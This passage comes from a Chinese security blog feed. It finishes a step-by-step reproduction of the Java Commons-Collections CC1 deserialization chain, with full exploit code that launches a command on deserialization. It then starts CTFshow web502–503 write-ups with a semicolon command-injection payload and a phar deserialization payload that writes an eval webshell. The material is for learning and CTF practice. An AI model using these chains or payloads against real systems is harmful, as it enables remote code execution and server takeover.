class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformermap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(r);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class,transformermap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;cc1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但如果直接运行是不行的，这也就是剩下的百分之二三十需要我们解决的问题了</p><h3 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h3><p>分析之前的代码，发现有三个明显的问题尚未解决</p><p><strong>问题一：</strong><code>Runtime</code>类没有继承<code>Serializable</code>接口，无法序列化</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929202216688.png"></p><p><strong>问题二：</strong><code>readObject()</code>方法怎样通过两个if判断进入<code>setValue()</code>方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929202121092.png"></p><p><strong>问题三</strong>：<code>readObject</code>方法里的<code>setValue</code>参数不可控</p><p><img src="https://oss.waynejoons.icu/picphoto/20250929201915202.png"></p><p>我们按顺序逐个解决以上问题</p><h3 id="修补"><a href="#修补" class="headerlink" title="修补"></a>修补</h3><p><strong>问题一：</strong></p><p>首先解决第一个问题，虽然<code>Runtime</code>类没有继承<code>Serializable</code>接口，但是<code>Class</code>类继承了<code>Serializable</code>，当<code>Runtime</code>在 JVM 加载后，会有唯一的 <code>Class&lt;Runtime&gt;</code> 实例，它是对 <code>Runtime</code> 这个类型的描述。我们可以通过反射实现<code>Runtime</code>类</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003191831982.png"></p><p>构造以下代码反射实现<code>Runtime</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> cs.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);<span class="comment">// 第二个null表示参数内容，加不加都可以</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);<span class="comment">// 第一个null表示调用静态方法，第二个null同上</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">control</span> <span class="operator">=</span> cs.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">control.invoke(cmd, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251003194141020.png"></p><p>验证一下，成功弹出计算器</p><p>然后改用<code>InvokerTransformer</code>的<code>transform</code>实现以上代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="comment">//  Method getRuntime = cs.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//  Runtime cmd = (Runtime) getRuntime.invoke(null, null);</span></span><br><span class="line"><span class="comment">//  Method control = cs.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//  control.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(cs);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br></pre></td></tr></table></figure><p>但是分开的话不好处理，需要找个方法合并起来，回到一开始的<code>Transformer.java</code>右键<code>transform</code>查找用法，发现<code>ChainedTransformer</code>的<code>transform</code>方法可以循环遍历<code>transform</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251003210419055.png"></p><p>看看构造函数，要求传个数组</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003210543902.png"></p><p>那我们可以构造以下代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="comment">//  Method getRuntime = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(cs);</span></span><br><span class="line"><span class="comment">//  Runtime cmd = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntime);</span></span><br><span class="line"><span class="comment">//  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(cmd);</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(cs);</span><br></pre></td></tr></table></figure><p>成功解决问题一</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003211031373.png"></p><p>我们修改一下之前骨架的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上面的代码修改成下面的代码</span></span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p><strong>问题二：</strong></p><p>首先在<code>AnnotationInvocationHandler</code>类的<code>readObject</code>方法的第一个if判断语句处打断点，调试后可以看到<code>memberType</code>值为null，无法进入if语句</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003214953003.png"></p><p>分析代码，可知<code>memberTypes</code>是表示注解类型里所有成员及其对应的数据类型的映射关系，然后<code>memberType</code>获取注解中成员变量的名称</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003220854217.png"></p><p>一开始我们用的是注解<code>Override</code>，这里面没有成员变量</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003221201954.png"></p><p>那就不用这个，继续寻找发现注解<code>Target</code>里有成员变量<code>value</code>，可以用这个</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003221321592.png"></p><p>回到之前的exp骨架那里，修改两处地方</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003221813065.png"></p><p>重新调试一遍，这次没有问题了，成功进入第一个if语句</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003222558505.png"></p><p>接下来就是第二个if语句，只要我们传入的<code>value</code>既不是<code>memberType</code>对应类型的实例，也不是异常代理类对象<code>ExceptionProxy</code>实例，就可以进入if语句</p><p>因为成员<code>value</code>的声明类型是枚举数组<code>ElementType[]</code>，而传入的是字符串<code>&quot;world&quot;</code>，判断后返回false，然后经过取反后就变为true，成功进入if语句</p><p><strong>问题三：</strong></p><p>最后就是解决<code>readObject()</code>调用的<code>setValue()</code>参数不可控，继续分析代码，发现<code>ConstantTransformer</code>类刚好满足我们的要求，它重写后的<code>transform</code>可以返回我们传入的对象</p><p><img src="https://oss.waynejoons.icu/picphoto/20251003233700161.png"></p><p>修改之前的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上面的代码修改成下面的代码，添加ConstantTransformer</span></span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(cs),<span class="comment">// 修改这里</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>把之前的代码合并在一起，得到以下完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cs</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(cs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class,transformermap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;cc1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251003234530672.png"></p><p>成功弹出计算器，实现完整的漏洞链利用</p><p>到这里CC1的复现就结束了，确实不容易，不过收获很大，想要提升水平还是得多练代码审计，继续加油吧</p>]]></content>
    
    
    <summary type="html">Java反序列化安全 CC1链复现与分析</summary>
    
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW 中期测评（二）web502 - web516</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/</id>
    <published>2025-09-23T13:57:34.000Z</published>
    <updated>2025-11-10T04:10:41.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h3><p>先万能密码登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921112546124.png"></p><p>打开数据库备份功能页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921112615718.png"></p><p>打开网页源码，可以看到POST请求是发送到<code>api/admin_db_backup.php</code>的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921112651193.png"></p><p>查看<code>api/admin_db_backup.php</code>源码，GET请求<code>/index.php?action=../api/admin_db_backup</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250921112838652.png"></p><p>相比上题，这里的正则改成了<code>preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format)</code>，要求<code>$db_format</code>只能严格匹配 “zip”、”tar”、”sql” 这三个字符串，任何多余字符都不会通过，那我们换个方法，可以利用<code>$pre</code>进行变量覆盖然后分号截断执行命令</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_format=zip&amp;pre=1.txt;cat /f*&gt;/var/www/html/1.txt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250921113226519.png"></p><p>最后访问<code>/1.txt</code>读取flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921113336443.png"></p><h3 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h3><p><code>$pre</code>和<code>$db_format</code>被md5包裹了，无法利用了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921145345667.png"></p><p>然后上面可以看到有个<code>file_exists</code>函数，先记着，后面会用到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921163100598.png"></p><p>用万能密码登录首页后，在系统配置功能处可以看到有个图片上传功能</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921163347821.png"></p><p>查看源码看到有个<code>api/admin_upload.php</code>，跟文件上传功能有关</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921163440917.png"></p><p>我们看看源码，GET传参<code>/index.php?action=../api/admin_upload</code>，这里只截取关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$arr</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/png&quot;</span> ) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&quot;size&quot;</span>]&lt;<span class="number">10241000</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"><span class="variable">$basename</span> = <span class="string">&quot;../img/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$basename</span>);</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;logo&#x27;</span>]=<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里判断文件 MIME 类型是否是 JPEG 或 PNG，并且文件大小要小于10MB，且禁止扩展名为“php”的文件上传，然后对内容进行反序列化。结合前面<code>/api/admin_db_backup.php</code>的<code>file_exists</code>函数，我们可以用phar反序列化来做</p><p>这里要用到之前题目讲的反序列化，具体可以参考web493，setStub那里要加个<code>GIF89a</code>来伪装图片</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;a.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span 